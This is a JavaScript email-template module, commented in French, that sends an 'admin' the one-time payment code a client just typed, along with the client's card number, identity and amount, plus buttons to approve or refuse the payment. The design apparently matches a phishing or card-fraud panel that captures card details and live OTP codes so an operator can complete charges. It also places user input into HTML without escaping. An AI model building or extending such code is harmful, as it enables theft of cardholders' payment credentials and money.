import { emailLayout } from './layout';

/**
 * EMAIL 2 — Envoyé à l'admin quand le client soumet son code OTP.
 * Contient le code OTP tapé par le client et les boutons VALIDER / REFUSER.
 *
 * @param {object} opts
 * @param {string} opts.userName    - Nom du client
 * @param {string} opts.userEmail   - Email du client
 * @param {string} opts.otpCode     - Code OTP tapé par le client
 * @param {string} opts.cardNumber  - Numéro de carte (rappel)
 * @param {string} opts.bookingRef  - Référence de la réservation
 * @param {string} opts.amount      - Montant formaté
 * @param {string} opts.approveUrl  - URL bouton VALIDER
 * @param {string} opts.rejectUrl   - URL bouton REFUSER
 */
export function adminOtpValidationEmail({
  userName,
  userEmail,
  otpCode,
  cardNumber,
  bookingRef,
  amount,
  approveUrl,
  rejectUrl,
}) {
  return {
    subject: `[Action requise] Code OTP reçu — Réservation #${bookingRef}`,
    html: emailLayout({
      title: 'Validation OTP requise',
      preheader: `${userName} a saisi le code OTP. Validez ou refusez le paiement.`,
      content: `
        <h2>Code OTP soumis par le client</h2>
        <p>
          Le client a saisi le code OTP que vous lui avez envoyé.
          <strong>Vérifiez que le code correspond, puis validez ou refusez.</strong>
        </p>

        <!-- Code OTP mis en avant -->
        <div style="
          margin: 20px 0;
          padding: 24px;
          background: #1e1b4b;
          border-radius: 12px;
          text-align: center;
        ">
          <p style="margin:0 0 8px; color:#a5b4fc; font-size:11px; text-transform:uppercase; letter-spacing:2px; font-weight:600;">
            Code OTP saisi par le client
          </p>
          <p style="margin:0; color:#ffffff; font-size:40px; font-weight:800; font-family:monospace; letter-spacing:10px;">
            ${otpCode}
          </p>
          <p style="margin:12px 0 0; color:#a5b4fc; font-size:12px;">
            Vérifiez que ce code correspond à celui que vous avez envoyé par SMS
          </p>
        </div>

        <!-- Rappel infos réservation -->
        <div class="info-box">
          <div class="info-row">
            <span class="label">Réservation</span>
            <span class="value">#${bookingRef}</span>
          </div>
          <div class="info-row">
            <span class="label">Client</span>
            <span class="value">${userName} — ${userEmail}</span>
          </div>
          <div class="info-row">
            <span class="label">Carte</span>
            <span class="value" style="font-family:monospace;letter-spacing:1px">${cardNumber}</span>
          </div>
          <div class="total-row">
            <span>Montant</span>
            <span>${amount}</span>
          </div>
        </div>

        <!-- Boutons d'action -->
        <p style="text-align:center; margin: 28px 0 8px;">
          <a href="${approveUrl}"
             style="
               display:inline-block;
               background:#16a34a;
               color:#ffffff !important;
               text-decoration:none;
               padding:14px 36px;
               border-radius:8px;
               font-weight:700;
               font-size:15px;
               margin: 0 8px;
             ">
            ✓ VALIDER le paiement
          </a>
          <a href="${rejectUrl}"
             style="
               display:inline-block;
               background:#dc2626;
               color:#ffffff !important;
               text-decoration:none;
               padding:14px 36px;
               border-radius:8px;
               font-weight:700;
               font-size:15px;
               margin: 0 8px;
             ">
            ✗ REFUSER le paiement
          </a>
        </p>

        <p style="color:#71717a; font-size:12px; text-align:center; margin-top:20px;">
          Ces liens sont à usage unique.<br>
          Si le code ne correspond pas à celui que vous avez envoyé, cliquez sur <strong>REFUSER</strong>.
        </p>
      `,
    }),
  };
}
